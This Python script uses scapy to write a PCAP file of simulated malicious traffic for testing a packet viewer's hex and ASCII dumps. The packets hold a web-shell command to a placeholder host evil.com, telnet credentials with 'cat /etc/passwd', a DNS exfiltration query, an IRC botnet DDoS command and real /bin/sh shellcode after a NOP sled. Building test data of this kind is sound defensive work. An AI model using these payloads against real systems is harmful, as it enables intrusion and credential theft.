#!/usr/bin/env python3
"""
Generate a malicious PCAP file with actual payload data for testing hex/ASCII dump features.
"""
from scapy.all import *

def generate_malicious_with_payload():
    packets = []
    
    # Malicious traffic on port 4444 (common backdoor port) with suspicious payload
    malicious_payload = b"GET /shell.php?cmd=whoami HTTP/1.1\r\nHost: evil.com\r\nUser-Agent: AttackerBot/1.0\r\n\r\n"
    
    # Create TCP connection with SYN
    syn = IP(src="192.168.1.100", dst="10.0.0.50") / TCP(sport=54321, dport=4444, flags="S", seq=1000)
    packets.append(syn)
    
    # SYN-ACK response
    syn_ack = IP(src="10.0.0.50", dst="192.168.1.100") / TCP(sport=4444, dport=54321, flags="SA", seq=2000, ack=1001)
    packets.append(syn_ack)
    
    # ACK to complete handshake
    ack = IP(src="192.168.1.100", dst="10.0.0.50") / TCP(sport=54321, dport=4444, flags="A", seq=1001, ack=2001)
    packets.append(ack)
    
    # Send malicious payload
    payload_pkt = IP(src="192.168.1.100", dst="10.0.0.50") / TCP(sport=54321, dport=4444, flags="PA", seq=1001, ack=2001) / Raw(load=malicious_payload)
    packets.append(payload_pkt)
    
    # More suspicious packets on port 23 (telnet) with credentials
    telnet_payload = b"admin\r\npassword123\r\ncat /etc/passwd\r\n"
    telnet_pkt = IP(src="172.16.0.99", dst="192.168.1.1") / TCP(sport=55555, dport=23, flags="PA") / Raw(load=telnet_payload)
    packets.append(telnet_pkt)
    
    # Suspicious DNS exfiltration attempt
    dns_payload = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06secret\x04data\x07example\x03com\x00\x00\x01\x00\x01"
    dns_pkt = IP(src="192.168.1.100", dst="8.8.8.8") / UDP(sport=12345, dport=53) / Raw(load=dns_payload)
    packets.append(dns_pkt)
    
    # IRC bot command on port 6667
    irc_payload = b"PRIVMSG #botnet :!ddos 192.168.1.1\r\n"
    irc_pkt = IP(src="10.10.10.10", dst="192.168.1.100") / TCP(sport=6667, dport=33333, flags="PA") / Raw(load=irc_payload)
    packets.append(irc_pkt)
    
    # Exploit attempt on port 31337 (elite/leet - common backdoor)
    exploit_payload = b"\x90\x90\x90\x90" + b"A" * 100 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    exploit_pkt = IP(src="192.168.1.100", dst="10.0.0.1") / TCP(sport=44444, dport=31337, flags="PA") / Raw(load=exploit_payload)
    packets.append(exploit_pkt)
    
    # Save to file
    wrpcap('malicious_with_payload.pcap', packets)
    print(f"✓ Generated malicious_with_payload.pcap with {len(packets)} packets containing payloads")
    print("  - Port 4444: Web shell command")
    print("  - Port 23: Telnet credentials")
    print("  - Port 53: DNS exfiltration")
    print("  - Port 6667: IRC botnet command")
    print("  - Port 31337: Buffer overflow exploit")

if __name__ == "__main__":
    generate_malicious_with_payload()
